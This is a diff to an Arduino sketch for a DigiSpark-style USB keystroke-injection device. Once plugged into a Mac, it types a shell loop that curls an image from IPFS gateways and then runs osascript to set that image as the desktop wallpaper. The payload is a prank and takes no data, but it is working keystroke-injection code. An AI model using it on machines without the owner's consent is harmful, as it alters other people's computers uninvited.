@@ -1,7 +1,10 @@
 #include "DigiKeyboard.h"
 #include "./VAR.h"
 
-#define DOMAINS "ipfs.io cloudflare-ipfs.com"
+#define DOMAINS "ipfs.io cloudflare-ipfs.com ipfs.karmanyaah.malhotra.cc"
+#define OSASCRIPT "osascript << EOF\ntell application \"Finder\"\nset desktop picture to POSIX file \"/Users/Shared/oreo.jpg\"\nend tell\nEOF\n"
+
+
 
 const bool login = 0;
 void setup() {
@@ -44,8 +47,8 @@ void loop() {
   DigiKeyboard.delay(3000);
 
 
-  DigiKeyboard.print(F("for i in " DOMAINS "; do curl https://$i" LINK " --output /Users/Shared/oreo.jpg && break; done; osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/Users/Shared/oreo.png\"';exit\n"));
-    DigiKeyboard.delay(3000);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print(F("for i in " DOMAINS "; do curl https://$i" LINK " --output /Users/Shared/oreo.jpg && break; done;\n" OSASCRIPT "exit\n"));
+    DigiKeyboard.delay(3500);  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(50);
 
